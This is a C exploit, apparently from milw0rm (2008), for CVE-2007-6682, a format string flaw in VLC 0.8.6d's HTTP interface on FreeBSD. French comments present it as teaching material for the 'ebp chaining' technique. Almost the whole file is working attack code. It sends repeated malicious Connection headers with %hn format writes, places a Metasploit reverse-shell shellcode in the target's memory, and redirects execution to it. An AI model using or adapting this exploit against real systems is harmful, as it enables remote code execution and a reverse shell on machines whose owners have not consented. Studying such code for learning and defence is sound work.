/* Epibite // bite since 1442
 * pown meme ta mamie
 */

/* Advisory from Luigi Auriemma
 * CVE-2007-6682 / format string in VideoLAN VLC 0.8.6d
 *
 * Description :
 * Format string vulnerability in the httpd_FileCallBack
 * function (network/httpd.c) in VideoLAN VLC 0.8.6d allows
 * remote attackers to execute arbitrary code via format
 * string specifiers in the Connection parameter.
 */

/* La faille n'a d'interet que dans un but d'apprentissage
 * d'une technique avance d'exploitation des chaines de
 * format.
 *
 * Toute la difficulte de l'exploitation est liee au fait
 * que la chaine de format se trouve dans un thread, et
 * la pile remplie avec des adresses du tas.
 * On est donc oblige d'utiliser la technique dite de
 * "l'ebp chaining".
 *
 * On pardonnera le manque de proprete et de portabilite,
 * defauts qui sont expliques et corriges durant son
 * utilisation sur la plateforme de tutoriaux de
 * l'Epitech Security Laboratory.
 */

/* Traduction:
 * This is ugly and not cross plateform, use it for
 * learning purpose. (^-^)
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>

#include <netinet/in.h>
#include <arpa/inet.h>

#include <sys/types.h>
#include <sys/socket.h>

int	connect_(char *, int);
void	exit_(int, char *);
char	*get_payload(unsigned short, unsigned short/* , unsigned short * */);
void	progressbar(void);
void	write_short(unsigned short, unsigned short);

#define REQUEST "GET / HTTP/1.0\r\n" \
                "Connection: "

/* Chaining ebp // FREEBSD8 - 0.8.6d :
 *
 *  (0xbf5fa838) -> 0xbf5fafa8  // 12$  httpd_FileCallBack()
 *         _____________/
 *        /
 *  (0xbf5fafa8) -> 0xbf5fafe8  // 488$ httpd_HostThread()
 *         _____________/
 *        /
 *  (0xbf5fafe8) -> 0x00000000  // 504$ pthread_getprio()
 *
 *  (0xbfbee2b8) // (bf5f)e2b8 is an eip value
 *                  because we write short by short,
 *                  we've just have to write (bfbe)
 *                  in order to have the sc addr.
 *  (0xbf5fa83c) // An eip -> 12$ + 4
 */

#define FIRST_EBP	12
#define SECOND_EBP	488
#define THIRD_EBP	504

#define FBSD8_ESP	( 0xbf5fa808 )
#define FBSD8_SCADDR	( 0xbfbee2b8 )

int		port;
char		*ip;

/* bsd_ia32_reverse - LHOST=127.0.0.1 LPORT=4321 Size=92 http://metasploit.com */
unsigned char	scode[] =
  "\x33\xc9\x83\xe9\xef\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x6c"
  "\x3c\x56\xcc\x83\xeb\xfc\xe2\xf4\x06\x5d\x0e\x55\x3e\x7e\x04\x8e"
  "\x3e\x54\x29\xcc\x6c\x3d\x9b\x4c\x04\x2c\x54\xdc\x8d\xb5\xb7\xa6"
  "\x7c\x6d\x06\x9d\xfb\x56\x34\x94\xa1\xbc\x3c\xce\x35\x8c\x0c\x9d"
  "\x3b\x6d\x9b\x4c\x25\x45\xa0\x9c\x04\x13\x79\xbf\x04\x54\x79\xae"
  "\x05\x52\xdf\x2f\x3c\x68\x05\x9f\xdc\x07\x9b\x4c";

int			main(int argc, char **argv)
{
  unsigned int		i;

  if (argc < 3)
    (void) exit_(1, "Usage: exploit ip port\n");
  ip = argv[1];
  port = atoi(argv[2]);
  printf("[+] Victim is : %s:%d...\n", ip, port);
  printf("[+] Shellcode size : %d // located at : 0x%08x\n",
	 strlen((char *)scode), FBSD8_SCADDR);
  printf("[+] EIP is located at : 0x%08x\n", FBSD8_ESP + FIRST_EBP * 4 + 4 + 2);

  (void) write_short((unsigned short)(FBSD8_ESP + (THIRD_EBP * 4) + 2),
		     FIRST_EBP);
  (void) write_short((unsigned short)(FBSD8_SCADDR >> 16), SECOND_EBP);
  (void) write_short((unsigned short)(FBSD8_ESP + (THIRD_EBP * 4)),
		     FIRST_EBP);

  for (i = 0; i < strlen((char*)scode); i += 2)
    {
      (void) write_short((unsigned short)(FBSD8_SCADDR + i), SECOND_EBP);
      (void) write_short((unsigned short)(*((unsigned short *)(scode + i))),
			 THIRD_EBP);
    }

  (void) write_short((unsigned short)(FBSD8_ESP + (THIRD_EBP * 4) + 2),
		     FIRST_EBP);
  (void) write_short((unsigned short)(FBSD8_ESP >> 16), SECOND_EBP);
  (void) write_short((unsigned short)(FBSD8_ESP + (THIRD_EBP * 4)), FIRST_EBP);
  (void) write_short((unsigned short)(FBSD8_ESP + FIRST_EBP * 4 + 4 + 2),
		     SECOND_EBP);
  (void) write_short((unsigned short)(FBSD8_SCADDR >> 16), THIRD_EBP);

  printf("[+] Done.\n");
  return (0);
}

char		*get_payload(unsigned short data,
			     unsigned short pop
			     /* unsigned short *offset */)
{
  static char	buffer[32];
  char		buffi[9];

  /* data = data - *offset; */
  if ((unsigned short)data < 8)
    {
      memset(buffi, '0', 9);
      buffi[data] = '\0';
      sprintf(buffer, "%s%%%d$hn", buffi, pop);
    }
  else
    sprintf(buffer, "%%%du%%%d$hn", data, pop);
  /* *offset = *offset + data; */
  return (buffer);
}

void	write_short(unsigned short data, unsigned short pop)
{
  char	buff[1024];
  int	ret;
  int	sock;

  memset(buff, '\0', 42);
  strcat(buff, REQUEST);
  strcat(buff, get_payload(data, pop));
  strcat(buff, "\r\n\r\n");
  sock = connect_(ip, port);
  if (write(sock, buff, strlen(buff)) < (int)strlen(buff))
    (void) exit_(1, "[-] write()\n");
  while ((ret = read(sock, buff, 1024)))
    ;
  if (close(sock) < 0)
    (void) exit_(1, "[-] close()\n");
  return ;
}

void	exit_(int i, char *tyop)
{
  write(2, tyop, strlen(tyop));
  (void) exit(i);
}

int			connect_(char *ip, int port)
{
  int			sock;
  struct sockaddr_in	s;

  (void) progressbar();
  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    (void) exit_(1, "[-] socket()\n");
  bzero(&s, sizeof(s));
  s.sin_family = AF_INET;
  s.sin_port = htons(port);
  s.sin_addr.s_addr = inet_addr(ip);
  if (connect(sock, (struct sockaddr *)&s, sizeof(s)) < 0)
    (void) exit_(1, "[-] connect()\n");
  return (sock);
}

void			progressbar(void)
{
  static unsigned int	c = 0;

  write(1, "D       ", 12
	- write(1, "[?] 8=====", 5 + ((c >> 2 & 1 ? -1 : 1)
				      * (++c & 3)
				      + (c % 0x20 & 100))));
  write(1, "p0wn in progress", 19);
  write(1, "...", c / 4 % 4);
  write(1, "   \r", 4);
  return ;
}

// milw0rm.com [2008-04-28]